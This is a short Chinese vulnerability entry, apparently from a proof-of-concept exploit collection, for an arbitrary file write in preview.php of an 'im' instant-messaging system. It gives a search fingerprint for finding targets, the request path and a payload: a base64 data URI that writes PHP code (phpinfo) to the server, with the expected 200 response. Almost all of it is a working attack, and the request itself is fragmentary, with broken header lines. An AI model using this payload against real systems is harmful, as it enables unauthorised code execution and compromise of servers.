# im即时通讯系统preview.php前台任意⽂件写⼊漏洞

- **系统**：im即时通讯系统preview.php前台任意⽂件写⼊　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/superloginAction.html"`
- **请求**：`GET /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1`

**请求体 / payload**
```
KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: su_webp=1; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time
-1=1734956910
Content-Length: 46
data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
```
- **预期**：200　|　—